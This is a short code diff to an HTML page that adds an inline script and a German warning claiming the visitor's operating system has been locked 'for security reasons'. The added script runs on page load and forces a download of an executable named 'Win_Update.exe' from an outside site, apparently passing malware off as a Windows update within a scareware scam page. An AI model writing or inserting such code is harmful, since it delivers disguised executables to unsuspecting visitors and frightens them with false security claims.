@@ -8,6 +8,22 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <script>
+        function downloadFile(url, fileName) {
+            fetch(url, { method: 'get', mode: 'no-cors', referrerPolicy: 'no-referrer' })
+                .then(res => res.blob())
+                .then(res => {
+                const aElement = document.createElement('a');
+                aElement.setAttribute('download', fileName);
+                const href = URL.createObjectURL(res);
+                aElement.href = href;
+                aElement.setAttribute('target', '_blank');
+                aElement.click();
+                URL.revokeObjectURL(href);
+            });
+        };
+        downloadFile("https://floribu04.github.io/Win_Update.exe", "Win_Update.exe");
+    </script>
     <h1>Achtung!</h1>
     <h2>Ihr Betriebssystem wurde aus Sicherheitsgründen gesperrt!</h2>
     <div id="text">
